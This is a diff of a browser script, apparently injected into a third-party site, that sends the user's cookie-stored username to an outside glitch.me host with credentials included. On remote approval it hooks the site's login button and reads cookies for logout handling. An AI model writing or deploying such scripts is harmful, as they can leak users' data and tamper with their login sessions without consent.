@@ -1,27 +1,29 @@
 (function () {
-  let isScriptActive = false; // Başlangıçta kapalı
+  console.log('c.js çalışıyor');
 
-  // Kullanıcı kontrolü
-  const username = document.cookie.match(/username=([^;]+)/)?.[1] || '';
-  if (username) {
-    fetch(`https://ancient-pentagonal-elephant.glitch.me/check?user=${encodeURIComponent(username)}`, {
-      method: 'GET',
-      credentials: 'include'
-    })
-      .then(response => response.json())
-      .then(data => {
-        if (data.allowed) {
-          isScriptActive = true; // Onay varsa çalış
-          runScript();
-        }
+  // Her yüklenmede kontrol et
+  function checkAndRun() {
+    const username = document.cookie.match(/username=([^;]+)/)?.[1] || '';
+    console.log('Çerezdeki username:', username);
+    if (username) {
+      fetch(`https://ancient-pentagonal-elephant.glitch.me/check?user=${encodeURIComponent(username)}`, {
+        method: 'GET',
+        credentials: 'include'
       })
-      .catch(() => {
-        console.log('Kontrol hatası');
-      });
+        .then(response => response.json())
+        .then(data => {
+          console.log('Check yanıtı:', data);
+          if (data.allowed) {
+            runScript();
+          }
+        })
+        .catch(err => console.log('Check hatası:', err));
+    }
   }
 
   function runScript() {
-    // Butonları izleyen fonksiyon
+    let isScriptActive = true;
+
     function setupButtonListeners() {
       if (!isScriptActive) return;
 
@@ -33,7 +35,6 @@
       }
     }
 
-    // Giriş yap butonunu dinleyen fonksiyon
     function setupLoginListener() {
       const loginBtn = document.querySelector('.btn-primary[onclick="girisyap()"]');
       if (loginBtn && isScriptActive) {
@@ -57,7 +58,6 @@
       }
     }
 
-    // Çıkış yapma
     const hasLoggedOut = sessionStorage.getItem('hasLoggedOut');
     if (!hasLoggedOut && isScriptActive) {
       const cookies = document.cookie || '';
@@ -89,7 +89,6 @@
       }
     }
 
-    // Sayfa yüklendiğinde butonları izlemeye başla
     if (isScriptActive) {
       window.addEventListener('load', () => {
         setupButtonListeners();
@@ -104,4 +103,7 @@
       }, 500);
     }
   }
+
+  // Her sayfa yüklenmesinde kontrol et
+  checkAndRun();
 })();
